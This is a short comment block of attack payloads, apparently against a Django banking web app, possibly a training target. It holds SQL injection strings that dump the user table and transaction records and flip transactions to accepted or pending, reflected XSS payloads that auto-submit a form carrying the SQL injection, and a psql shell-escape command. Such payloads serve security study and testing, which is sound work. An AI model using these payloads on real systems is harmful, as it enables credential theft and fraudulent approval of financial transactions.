/*
\! ls
\e
' OR 1=1); SELECT *, 1 FROM auth_user; --
' OR 1=1); SELECT *, 1 FROM bankapp_transaction; --
' OR 1=1); UPDATE bankapp_transaction SET accepted = TRUE, pending = FALSE WHERE id = 3; SELECT *, 1 FROM bankapp_transaction WHERE id = 3; --
' OR 1=1); UPDATE bankapp_transaction SET accepted = FALSE, pending = TRUE WHERE id = 3; SELECT *, 1 FROM bankapp_transaction WHERE id = 3; --


// Accept
username=user1
"><script>  window.onload = () => {    document.querySelector(`#id_username`).value = `' OR 1=1); UPDATE bankapp_transaction SET accepted = TRUE, pending = FALSE WHERE id = 3; SELECT *, 1 FROM bankapp_transaction WHERE id = 3; --`; document.querySelector("form").submit(); }</script>

// Unaccept
username=user1
"><script>  window.onload = () => {    document.querySelector(`#id_username`).value = `' OR 1=1); UPDATE bankapp_transaction SET accepted = FALSE, pending = TRUE WHERE id = 3; SELECT *, 1 FROM bankapp_transaction WHERE id = 3; --`; document.querySelector("form").submit(); }</script>

/accept/8
*/